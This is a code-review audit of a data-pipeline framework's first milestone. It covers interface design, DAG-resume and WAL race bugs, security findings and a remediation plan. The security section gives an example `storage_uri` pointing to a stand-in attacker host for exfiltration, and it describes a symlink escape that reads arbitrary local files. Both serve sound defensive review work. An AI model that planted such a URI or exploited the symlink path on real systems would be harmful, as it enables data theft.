# S1 Walking Skeleton — Critical Audit

Four independent adversarial lenses reviewed branch `s1-walking-skeleton` (PR #22): correctness/architecture-fidelity, security/robustness, DoD-compliance/test-honesty, and architecture-depth (Ousterhout lens, per the improve-codebase-architecture skill). CI: all 6 jobs green (lint·type·test·build on 3.11 & 3.12 + MinIO `s3://`).

## Verdict

**S1 is a sound foundation and passes all four lenses (PASS-WITH-NOTES).** The seams that matter — Storage (fsspec), the Provenance/Classification contracts, the entry-point ProviderRegistry, the Pipeline DAG — are genuinely deep, testable through their public interfaces, and correctly implement every ADR. Tests are honest (real `ValidationError` on missing Provenance; byte-level idempotency; real crash-resume).

**But the audit found two seam-level issues that are cheap now and expensive after S2 builds real providers on them.** These are not S1 bugs (S1's linear passthrough never triggers them) — they are foundation contracts that S2–S13 inherit. The recommendation is to fix them before S2, not after.

## Deepening candidates (architecture-depth lens)

### C-A1 · Parser Capability is over-fit to passthrough — **Strong / must-fix-before-S2**
- **Files**: `latence-core/capability.py` (Parser protocol), the plaintext provider, `runner.py` dispatch.
- **Problem**: `Parser.parse(self, records: Iterable[DocumentRecord]) -> Iterator[DocumentRecord]`. A passthrough consumes `DocumentRecord`s fine, but a **real** parser (PDF, image, Office) consumes **bytes**, not already-parsed records. Every S2+ parser would have to unwrap a `DocumentRecord` just to ignore its content — a leaky abstraction across the one seam every parser must cross.
- **Solution**: introduce a `ParserInput` contract (`provenance`, `classification`, `content: bytes | str`, `config`) and widen the protocol to `parse(inputs: Iterable[ParserInput]) -> Iterator[DocumentRecord]`.
- **Benefit**: seam clarity + test-surface — a PDF parser takes bytes directly; tests feed bytes, no ceremony. Strengthens (does not conflict with) ADR-0004.
- **Before→After**: "consume DocumentRecords" (fits only S1) → "consume ParserInput" (correct for S1–S13).
- **Cost**: ~2 hours now vs. ~2 days once every parser's tests exist.

### C-A2 · Runner embeds per-capability dispatch — **Worth exploring / should-fix by S6**
- **Files**: `runner.py::_execute_stage` (if/elif per `CapabilityKind`).
- **Problem**: each new stage adds an if-branch with a stage-specific calling convention; by S13 that's ~13 branches, and stage-run logic is scattered across `runner.py` + the protocol + the provider (a locality scavenger hunt).
- **Solution**: a capability-executor registry (`CAPABILITY_REGISTRY[kind].invoke(provider, ctx)`), one small executor per kind.
- **Benefit**: locality + leverage — adding a stage registers an executor instead of editing the Runner; each executor is unit-testable in isolation. Still delegates (ADR-0003 intact).

### C-A3 · Test reaches into `Storage._fs` — **Minor nit**
- **Files**: `test_runner.py` uses `s._fs.rm()` to simulate a crash.
- **Solution**: add a public `Storage.remove()` and use it. Keeps "the interface is the test surface" honest.

### C-A4 · Stage locality scattered / Runner mixes concerns — **Speculative**
- Understanding "how a stage runs" spans 4 files; `runner.py` (237 LOC) mixes topological ordering, state-path layout, WAL/checkpointing, dispatch, and reporting. Optional extraction (`RunState`/`CheckpointStore`, `docs/stages/`) once external providers expose the friction. Fine for S1.

## Correctness findings

### C-C1 · Converging DAG corrupts data on resume — **Critical (latent; S2-blocking)**
- `runner.py` threads a single `current` output that is overwritten as each completed stage resumes from checkpoint. For a converging DAG (`{parse1, parse2} -> export`) with a partial resume, the second resume overwrites the first, and the downstream stage silently uses only one parent's output. **S1 is linear so it never fires**, but the Pipeline schema *allows* `depends_on: [a, b]`. Fix: thread per-stage outputs in a `dict[str, list[Record]]` and gather a stage's inputs from all its dependencies.

### C-C3 · Schema allows multi-input; Runner assumes single input — **Medium (same root as C-C1)**
- `Stage.depends_on` accepts a list, but `_execute_stage` takes a single `incoming`. No validation rejects multi-dependency stages. Minimum fix: a Pipeline validator that fails fast until multi-input is truly supported; full fix: the dict threading in C-C1.

### C-C2 · WAL append is racy under future parallelism — **Medium**
- `_wal_append` does read-modify-write on one file; concurrent stages (S2+) would lose entries. S1 is single-threaded (safe today). Fix: uuid-suffixed per-line log files instead of a single appended object.

### C-C4 · Offset units (byte vs. character) unpinned — **Low**
- `Provenance.char_start/char_end` are Python string indices; the byte/char distinction is undocumented and diverges for multibyte UTF-8. Harmless for S1's passthrough; matters for S2 chunking/span extraction. Fix: pin semantics + name/document explicitly.

## Security findings

### C-S1 · Symlink escape in LocalFolderSource — **Medium**
- fsspec `walk()` follows symlinks by default; a symlink in the source folder can read arbitrary files the process can access (proven against `/tmp/secret.txt`). Fix: default `follow_symlinks=False` with an opt-in config flag, and document.

### C-S2 · No scheme allowlist on `storage_uri` — **Medium**
- `Storage` passes any URI scheme to `fsspec.filesystem`; a pipeline YAML could set `storage_uri: http://attacker/exfil`. Today it fails only because optional deps are absent — a silent, not explicit, guard. Fix: allowlist (`file`, `memory`, `s3`, `gs`, `abfs`, `az`) and reject the rest with a clear error.

### C-S3 · `Stage.config` is a schemaless dict — **Low-Medium**
- Providers receive arbitrary keys unvalidated. Fix (pattern-setting): providers declare a Pydantic config model validated at load; document the convention now.

### Passes (security)
`yaml.safe_load` (no code-exec), no path traversal, no secret logging, graceful on corrupt/empty/huge files. Note to document: a credential-bearing `source_uri` would leak into exports — URIs must not carry secrets.

## DoD / test-honesty

All Baseline-bar boxes met; tests are real, not tautological. One gap:
### C-D1 · Built-in providers lack isolated unit tests — **Low**
- `LocalFolderSource` / `JsonlParquetExport` are covered only through e2e. Add isolated edge-case tests (missing dir, encoding errors, empty/large payloads) before G1.

## Remediation plan

**Fix before S2 (foundation seams — cheap now, expensive later):**
- C-A1 widen Parser → `ParserInput` contract.
- C-C1 + C-C3 Runner per-stage output threading + multi-input guard/support.
- C-S2 Storage scheme allowlist.
- C-S1 symlink handling in LocalFolderSource.

**Fix before G1 (follow-up issues):**
- C-A2 capability-executor registry (before S6).
- C-A3 `Storage.remove()` public method.
- C-C2 WAL per-line files.
- C-C4 offset-unit semantics.
- C-S3 per-provider config schema pattern.
- C-D1 built-in provider unit tests.
- Add `SECURITY.md` (trust model: pipelines authored by trusted users in S1; no creds in URIs; source folders under user control).

**Speculative (revisit when friction appears):** C-A4 locality/Runner extraction.

Widening the Parser to `ParserInput` is a seam-contract change worth an ADR and a CONTEXT.md term once adopted.
